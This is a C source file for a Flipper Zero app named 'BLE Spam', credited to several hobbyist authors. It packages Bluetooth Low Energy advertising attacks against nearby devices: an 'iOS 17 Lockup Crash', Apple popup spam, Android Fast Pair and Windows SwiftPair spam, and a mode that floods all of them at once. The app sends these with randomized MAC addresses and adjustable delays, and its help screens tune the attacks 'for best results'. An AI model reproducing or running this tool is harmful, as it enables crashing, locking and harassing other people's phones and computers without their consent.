#include <gui/gui.h>
#include <furi_hal_bt.h>
#include <gui/elements.h>

#include "protocols/_registry.h"

// Hacked together by @Willy-JL
// Custom adv API by @Willy-JL (idea by @xMasterX)
// iOS 17 Crash by @ECTO-1A
// Android and Windows Pairs by @Spooks4576 and @ECTO-1A
// Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
// Controversy explained at https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam

typedef struct {
    const char* title;
    const char* text;
    const BleSpamProtocol* protocol;
    BleSpamPayload payload;
} Attack;

static Attack attacks[] = {
    {
        .title = "+ Kitchen Sink",
        .text = "Flood all attacks at once",
        .protocol = NULL,
        .payload =
            {
                .random_mac = true,
                .cfg = {},
            },
    },
    {
        .title = "iOS 17 Lockup Crash",
        .text = "Newer iPhones, long range",
        .protocol = &ble_spam_protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeCustomCrash,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Apple Action Modal",
        .text = "Lock cooldown, long range",
        .protocol = &ble_spam_protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeNearbyAction,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Apple Device Popup",
        .text = "No cooldown, close range",
        .protocol = &ble_spam_protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeProximityPair,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Android Device Pair",
        .text = "Reboot cooldown, long range",
        .protocol = &ble_spam_protocol_fastpair,
        .payload =
            {
                .random_mac = true,
                .cfg =
                    {
                        .fastpair = {},
                    },
            },
    },
    {
        .title = "Windows Device Found",
        .text = "Requires enabling SwiftPair",
        .protocol = &ble_spam_protocol_swiftpair,
        .payload =
            {
                .random_mac = true,
                .cfg =
                    {
                        .swiftpair = {},
                    },
            },
    },
};

#define ATTACK_COUNT ((signed)COUNT_OF(attacks))

uint16_t delays[] = {20, 50, 100, 200};

typedef struct {
    bool resume;
    bool advertising;
    uint8_t delay;
    FuriThread* thread;
    int8_t index;
} State;

static int32_t adv_thread(void* ctx) {
    State* state = ctx;
    uint8_t size;
    uint16_t delay;
    uint8_t* packet;
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    BleSpamPayload* payload = &attacks[state->index].payload;
    const BleSpamProtocol* protocol = attacks[state->index].protocol;
    if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));

    while(state->advertising) {
        if(protocol) {
            protocol->make_packet(&size, &packet, &payload->cfg);
        } else {
            ble_spam_protocols[rand() % ble_spam_protocols_count]->make_packet(
                &size, &packet, NULL);
        }
        furi_hal_bt_custom_adv_set(packet, size);
        free(packet);

        if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
        delay = delays[state->delay];
        furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
        furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
        furi_hal_bt_custom_adv_stop();
    }

    return 0;
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
        if(state->resume) furi_hal_bt_start_advertising();
    } else {
        state->resume = furi_hal_bt_is_active();
        furi_hal_bt_stop_advertising();
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

#define PAGE_MIN (-3)
#define PAGE_MAX ATTACK_COUNT
enum {
    PageHelpApps = PAGE_MIN,
    PageHelpDelay,
    PageHelpDistance,
    PageStart = 0,
    PageEnd = ATTACK_COUNT - 1,
    PageAboutCredits = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const char* back = "Back";
    const char* next = "Next";
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    const Attack* attack =
        (state->index >= 0 && state->index <= ATTACK_COUNT - 1) ? &attacks[state->index] : NULL;
    const BleSpamPayload* payload = attack ? &attack->payload : NULL;
    const BleSpamProtocol* protocol = attack ? attack->protocol : NULL;

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 4, 3, protocol ? protocol->icon : &I_ble);
    canvas_draw_str(canvas, 14, 12, "BLE Spam");

    switch(state->index) {
    case PageHelpApps:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageHelpDelay:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageHelpDistance:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# is limited, attacks\n"
            "work under 1 meter but a\n"
            "few are marked 'long range'",
            false);
        break;
    case PageAboutCredits:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Credits");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam: \e#WillyJL\e# XFW\n"
            "Apple+Crash: \e#ECTO-1A\e#\n"
            "Android+Win: \e#Spooks4576\e#\n"
            "                                   Version \e#2.0\e#",
            false);
        break;
    default: {
        if(!attack) break;
        char str[32];

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            ATTACK_COUNT,
            protocol ? protocol->get_name(&payload->cfg) : "Everything");
        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 21, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 32, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t ble_spam(void* p) {
    UNUSED(p);
    State* state = malloc(sizeof(State));
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 4096);

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        bool is_attack = state->index >= 0 && state->index <= ATTACK_COUNT - 1;
        bool advertising = state->advertising;
        switch(input.key) {
        case InputKeyOk:
            if(is_attack) toggle_adv(state);
            break;
        case InputKeyUp:
            if(is_attack && state->delay < COUNT_OF(delays) - 1) {
                state->delay++;
            }
            break;
        case InputKeyDown:
            if(is_attack && state->delay > 0) {
                state->delay--;
            }
            break;
        case InputKeyLeft:
            if(state->index > PAGE_MIN) {
                if(advertising) toggle_adv(state);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < PAGE_MAX) {
                if(advertising) toggle_adv(state);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    furi_thread_free(state->thread);
    free(state);
    return 0;
}
